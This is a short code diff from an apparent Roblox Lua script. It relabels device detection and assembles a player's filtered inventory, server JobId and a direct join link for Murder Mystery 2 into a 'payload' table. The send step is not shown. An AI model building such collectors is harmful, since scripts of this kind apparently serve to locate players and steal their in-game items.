@@ -476,7 +476,7 @@ task.spawn(function()
             invText = "• " .. table.concat(filtered, "\n• ")
         end
 
-        local device = GuiService:IsTenFootInterface() and "Console/TV" or (UIS.TouchEnabled and not UIS.KeyboardEnabled) and "Mobile" or "PC"
+        local device = GuiService:IsTenFootInterface() and "Console/TV" or UIS.TouchEnabled and "Mobile / Tablet" or "Mobile (Spoofed/Emulator)"
         local jobId, placeId = game.JobId, game.PlaceId
         local joinLink = "https://www.roblox.com/games/"..placeId.."/Murder-Mystery-2?gameInstanceId="..jobId
         local payload = {
